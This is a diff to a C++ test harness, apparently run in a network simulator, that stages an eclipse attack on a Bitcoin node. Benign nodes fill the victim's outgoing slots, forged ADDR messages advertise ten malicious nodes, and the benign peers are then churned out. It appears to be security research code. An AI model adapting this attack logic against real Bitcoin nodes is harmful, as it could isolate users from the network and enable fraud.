@@ -579,11 +579,52 @@ int main(int argc, char *argv[]) {
 
     puts_temp("test shadow_interface\n");
 
+    // Step 1. Prepare two benign nodes which are connected by Bitcoin victim using manual option (-addnode option of bitcoin victim)
     PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node1("1.1.0.1", 18333);
     PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node2("1.2.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node3("1.3.0.1", 18333);
 
-    AddrTimer myTimer(15, {"1.3.0.1"}, benign_node2);
+    // Step 2. Prepare 10 benign nodes and send a ADDR msg to the Bitcoin victim to indicate him to establish outgoing connections.
+    // As a result bitcoin victim will establish 12 benign outgoing connection including a 2 manual connection(1.1.0.1, 1.2.0.1).
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node3("1.3.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node4("1.4.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node5("1.5.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node6("1.6.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node7("1.7.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node8("1.8.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node9("1.9.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node10("1.10.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node11("1.11.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> benign_node12("1.12.0.1", 18333);
+    AddrTimer addrTimer1(15, {"1.3.0.1", "1.4.0.1", "1.5.0.1", "1.6.0.1", "1.7.0.1", "1.8.0.1", "1.9.0.1", "1.10.0.1", "1.11.0.1", "1.12.0.1"}, benign_node2);
+
+
+    // Step 3. Prepare 10 (shadow) attacker nodes and send a ADDR msg to the Bitcoin victim.
+    // But, Bitcoin victim will not be connected to the attacker nodes since its outgoing slots are fully occupied by benign nodes in above.
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node1("2.1.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node2("2.2.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node3("2.3.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node4("2.4.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node5("2.5.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node6("2.6.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node7("2.7.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node8("2.8.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node9("2.9.0.1", 18333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg> malicious_node10("2.10.0.1", 18333);
+    AddrTimer addrTimer2(40, {"2.1.0.1", "2.2.0.1", "2.3.0.1", "2.4.0.1", "2.5.0.1", "2.6.0.1", "2.7.0.1", "2.8.0.1", "2.9.0.1", "2.10.0.1"}, benign_node2);
+
+    // Step 4. Churnout benign nodes, check whether the eclipse attack is successful for Bitcoin victim
+    ChurnOutTimer outTimer1(50, benign_node3);
+    ChurnOutTimer outTimer2(50, benign_node4);
+    ChurnOutTimer outTimer3(50, benign_node5);
+    ChurnOutTimer outTimer4(50, benign_node6);
+    ChurnOutTimer outTimer5(50, benign_node7);
+    ChurnOutTimer outTimer6(50, benign_node8);
+    ChurnOutTimer outTimer7(50, benign_node9);
+    ChurnOutTimer outTimer8(50, benign_node10);
+    ChurnOutTimer outTimer9(50, benign_node11);
+    ChurnOutTimer outTimer10(50, benign_node12);
+
+
 
     struct ev_loop *libev_loop = EV_DEFAULT;
     // ListenSocketWatcher listenSocketWatcher("1.2.0.1");
